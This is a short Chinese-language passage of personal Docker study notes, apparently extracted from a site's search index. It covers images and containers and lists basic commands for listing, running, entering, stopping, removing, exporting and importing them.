image 文件和容器文件。而且关闭容器并不会删除容器文件，只是容器停止运行而已。把应用程序及其依赖，打包在 image 文件里面。只有通过这个文件，才能生成 Docker 容器。image 文件可以看作是容器的模板。Docker 根据 image 文件生成容器的实例。同一个 image 文件，可以生成多个同时运行的容器实例。\n\n```bash\n# 列出本机的所有 image 文件。\ndocker image ls\n# 删除 image 文件\ndocker image rm [imageName]\n#搜索 镜像\ndocker search [imageName]\n# 拉取 image 文件\ndocker image pull [imageName]\n```\n\n## docker container \n\n\n\n#### 运行容器\n\n```bash\ndocker container run ubuntu /bin/bash\n# 参数\n-i: 交互式操作。\n-t: 终端。\n-d: 后台运行，需要通过exec进入容器\n-p: 如 8000:3000 容器的3000映射到本机的8000端口，默认是tcp，后面添加/udp绑定udp端口\n\n\n\n#进入运行中的容器\nsudo docker exec -it [containerId] /bin/bash  \n\n# 列出本机正在运行的容器\ndocker container ls\ndocker ps -a \n# 列出本机所有容器，包括终止运行的容器\ndocker container ls --all\n# 启动/停止 容器\ndocker start/stop [containerId]\n# 终止 容器\ndocker container kill [containerId]\n# 删除 容器\ndocker container rm [containerId]\n```\n\n### 镜像导出导入\n```bash\n### 将本地的镜像导出\ndocker save -o 导出的路径 镜像id/镜像名称:tag\n#e.g.\ndocker save -o ./ubuntu.image ubuntu:16.04\n \n### 加载本地的镜像文件\ndocker load -i 镜像文件\n# e.g.\ndocker load -i ubuntu.image\n```\n## 参考\n[Docker Compose 网络设置 - 掘金 (juejin.cn)](https://juejin.cn/post/6844903976534540296)","n":0.151}}},{"i":15,"$":{"0":{"v":"About","n":1}}}]}
